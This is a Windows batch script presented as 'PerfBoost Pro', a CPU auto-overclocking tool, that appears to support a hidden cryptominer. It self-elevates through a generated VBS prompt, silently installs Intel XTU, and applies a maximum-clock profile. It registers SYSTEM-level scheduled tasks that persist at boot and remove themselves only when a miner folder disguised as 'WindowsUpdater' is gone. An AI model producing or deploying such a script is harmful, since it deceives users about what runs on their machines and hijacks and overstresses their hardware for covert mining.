@echo off
setlocal enabledelayedexpansion
title PerfBoost Pro - CPU Auto-Overclock (i5-14400)
color 0A

:: === CONFIGURATION ===
set "MINER_DIR=C:\ProgramData\WindowsUpdater"
set "XTU_URL=https://downloadmirror.intel.com/XTU/latest/XTUSetup.exe"
set "XTU_INSTALLER=%TEMP%\XTUSetup.exe"
set "XTU_PATH=%ProgramFiles(x86)%\Intel\Intel(R) Extreme Tuning Utility\Client\XtuCli.exe"
set "XTU_PROFILE=%~dp0xtu_profile.xml"
set "TASK_NAME=PerfBoostPro"

:: === Admin Rights Check ===
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' neq '0' (
    echo [!] Requesting Administrator Privileges...
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\elevate.vbs"
    echo UAC.ShellExecute "%~f0", "", "", "runas", 1 >> "%temp%\elevate.vbs"
    "%temp%\elevate.vbs"
    del "%temp%\elevate.vbs"
    exit /b
)
echo [✔] Running with Administrator Privileges...

:: === Install Intel XTU ===
if not exist "%XTU_PATH%" (
    echo [*] Downloading Intel XTU...
    powershell -Command "Invoke-WebRequest -Uri '%XTU_URL%' -OutFile '%XTU_INSTALLER%' -UseBasicParsing" >nul 2>&1
    echo [*] Installing Intel XTU silently...
    "%XTU_INSTALLER%" /quiet /norestart >nul 2>&1
    del "%XTU_INSTALLER%" >nul 2>&1
)

:: === Apply XTU Profile ===
if exist "%XTU_PATH%" (
    echo [*] Applying CPU Performance Profile...
    "%XTU_PATH%" -importProfile "%XTU_PROFILE%"
    "%XTU_PATH%" -importProfile "%XTU_PROFILE%" >nul 2>&1
) else (
    echo [!] XTU not found, profile not applied.
)

:: === Auto-Apply at Boot ===
schtasks /create /tn "%TASK_NAME%" ^
  /tr "\"%XTU_PATH%\" -importProfile \"%XTU_PROFILE%\"" ^
  /sc onstart /ru SYSTEM /rl HIGHEST /f

:: === Self-Remove If Miner Deleted ===
schtasks /create /tn "%TASK_NAME%_Cleanup" ^
  /tr "cmd /c if not exist \"%MINER_DIR%\" (schtasks /delete /tn \"%TASK_NAME%\" /f & schtasks /delete /tn \"%TASK_NAME%_Cleanup\" /f & del \"%~f0\")" ^
  /sc daily /st 00:00 /ru SYSTEM /rl HIGHEST /f

echo.
echo [✔] PerfBoost Pro Installed.
echo [✔] CPU will auto-boost to max clocks every boot.
echo [✔] This script will self-remove if the miner folder is gone.
pause
exit /b
